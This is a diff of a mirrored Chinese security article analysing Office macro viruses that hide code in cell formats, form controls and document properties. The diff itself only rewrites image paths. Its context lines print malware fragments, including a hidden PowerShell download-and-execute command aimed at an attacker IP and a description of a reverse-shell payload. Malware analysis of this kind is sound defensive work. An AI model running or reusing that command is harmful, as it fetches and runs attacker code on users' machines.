@@ -3,7 +3,7 @@
 			<head>
 			     <title>技术揭秘：宏病毒代码三大隐身术 - 360安全卫士</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/16069">http://drops.wooyun.org/papers/16069</a></h1>
 				
@@ -29,11 +29,11 @@
 
 <p>virustotal 扫描结果：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/2016052315361847099115.jpg" alt="p1"></p>
+<p><img src="../images_result/images/2016052315361847099115.jpg" alt="p1"></p>
 
 <p>样本对自身 VBAProject 进行了加密，</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/201605231536203730124.jpg" alt="p2"></p>
+<p><img src="../images_result/images/201605231536203730124.jpg" alt="p2"></p>
 
 <p>破解之后，看到了宏代码执行入口函数 Auto_Open，</p>
 
@@ -62,11 +62,11 @@ End Sub
 
 <p>单元格格式设置为三个 <code>;;;</code> 时，单元格内容就会被隐藏。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/201605231536228532335.jpg" alt="p3"></p>
+<p><img src="../images_result/images/201605231536228532335.jpg" alt="p3"></p>
 
 <p>单元格的格式默认是显示的，初始设置为，</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/201605231536237139544.jpg" alt="p4"></p>
+<p><img src="../images_result/images/201605231536237139544.jpg" alt="p4"></p>
 
 <p>去掉隐藏后，查看表格中该值是 Fnslr12 ， 即病毒的功能入口函数名称，函数代码为，</p>
 
@@ -135,7 +135,7 @@ End Sub
 
 <p>函数运行结果为，在 1001 行往下，依次每行填入数据。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/201605231536251118354.jpg" alt="p5"></p>
+<p><img src="../images_result/images/201605231536251118354.jpg" alt="p5"></p>
 
 <h3>2、对是否运行过一次做检查</h3>
 
@@ -163,7 +163,7 @@ End If
 
 <p>其中，病毒拼凑生成文件的目录路径时，从表格 2 的Cells(998, 40) 中读取 ，该值为环境变量值 userprofile.</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/201605231536274481464.jpg" alt="p6"></p>
+<p><img src="../images_result/images/201605231536274481464.jpg" alt="p6"></p>
 
 <p>只是，病毒作者并没有继续完善相关代码。实际测试运行样本也并没有生成该文件，猜测可能作者后续加入该功能，或者该功能已经被取消。</p>
 
@@ -226,13 +226,13 @@ Fnslr10 = Fnslr1
 
 <p>写入 Macro1.exe 所需的数据，从 Excel 表格中 Cells(997, 40) 周围读取，实际测试数据开始位置是 1001行，</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/201605231536297293874.jpg" alt="p7"></p>
+<p><img src="../images_result/images/201605231536297293874.jpg" alt="p7"></p>
 
 <p>代码尾部使用 Shell 函数，启动生成的 Macro1.exe 。</p>
 
 <p>文件信息</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/201605231536318646784.jpg" alt="p8"></p>
+<p><img src="../images_result/images/201605231536318646784.jpg" alt="p8"></p>
 
 <p>可执行文件是 x64位的，功能是，启动 powershell 附带 –enc 参数，执行一段 shellcode ，这段 shellcode是一个 reverse shell ，连接黑客服务器，等待下达命令。</p>
 
@@ -262,7 +262,7 @@ Shell TempFileName, vbHide
 
 <p>尾部使用 Shell 函数 启动该脚本，结果是在用户机器创建了一个计划任务， 每隔一小时运行一次 上面生成的 Macro1.exe 。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/201605231536327394194.jpg" alt="p9"></p>
+<p><img src="../images_result/images/201605231536327394194.jpg" alt="p9"></p>
 
 <h3>6、弹窗显示输入密码才能继续进行运行</h3>
 
@@ -279,7 +279,7 @@ pword = InputBox("Please enter a password to proceed", "Password Required", "***
   End Select
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160523/2016052315363417559104.jpg" alt="p10"></p>
+<p><img src="../images_result/images/2016052315363417559104.jpg" alt="p10"></p>
 
 <p>从病毒代码中知道，要求输入的密码是 “Alon2016” 。</p>
 
@@ -287,7 +287,7 @@ pword = InputBox("Please enter a password to proceed", "Password Required", "***
 
 <p>接下来是现场清理和掩饰，删除调用Build 函数在表格生成的数据，在表格的开头显著位置填入在其他表格中保存的邮件收件人地址信息，</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/2016052315363564132116.jpg" alt="p11"></p>
+<p><img src="../images_result/images/2016052315363564132116.jpg" alt="p11"></p>
 
 <p>小结：该样本的特别之处有：</p>
 
@@ -312,15 +312,15 @@ pword = InputBox("Please enter a password to proceed", "Password Required", "***
 
 <p>virustotal 扫描结果：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/2016052315363755773124.jpg" alt="p12"></p>
+<p><img src="../images_result/images/2016052315363755773124.jpg" alt="p12"></p>
 
 <p>查看该文件的宏，</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/2016052315363983561133.jpg" alt="p13"></p>
+<p><img src="../images_result/images/2016052315363983561133.jpg" alt="p13"></p>
 
 <p>此文件看起来像是正常的SQL操作类的宏代码，但是当我们查看窗体 Ultra 时发现，</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/2016052315364071606143.jpg" alt="p14"></p>
+<p><img src="../images_result/images/2016052315364071606143.jpg" alt="p14"></p>
 
 <p>有个控件的Caption中存放了可疑数据如下，</p>
 
@@ -374,11 +374,11 @@ hendibe.exe
 
 <p>此样本因为代码有问题，没能成功运行起来。找到宏代码中使用 Microsoft.XMLHTTP 对象下载文件的位置，加上断点调试，起先因为作者疏忽，忘记书写一个双引号，导致编译失败，</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/2016052315364260041152.jpg" alt="p15"></p>
+<p><img src="../images_result/images/2016052315364260041152.jpg" alt="p15"></p>
 
 <p>之后，运行到下载文件处时，出现了报错。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/2016052315364477288162.jpg" alt="p16"></p>
+<p><img src="../images_result/images/2016052315364477288162.jpg" alt="p16"></p>
 
 <h1>0x03 文档内建属性隐藏代码</h1>
 
@@ -393,7 +393,7 @@ hendibe.exe
 
 <p>virustotal 扫描结果:</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/2016052315364543066172.jpg" alt="p17"></p>
+<p><img src="../images_result/images/2016052315364543066172.jpg" alt="p17"></p>
 
 <p>此样本的vba 宏代码只有1个文件，很简短，</p>
 
@@ -423,7 +423,7 @@ End Function
 
 <p>响应两个文档打开事件，AutoOpen 与Auto_Open，直接执行 winshell函数， winshell函数读取文件内建属性，Manager 的值，直接执行起来。Manager值，我们使用右键文件属性，查看为，</p>
 
-<p><img src="http://static.wooyun.org//drops/20160523/2016052315364766230182.jpg" alt="p18"></p>
+<p><img src="../images_result/images/2016052315364766230182.jpg" alt="p18"></p>
 
 <pre><code>#!powershell
 powershell.exe -nop -w hidden -c $b=new-object net.webclient;$b.proxy=[Net.WebRequest]::GetSystemWebProxy();$b.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $b.downloadstring('http://37.28.154.204:8081/ygklKbyIVG51Kol');
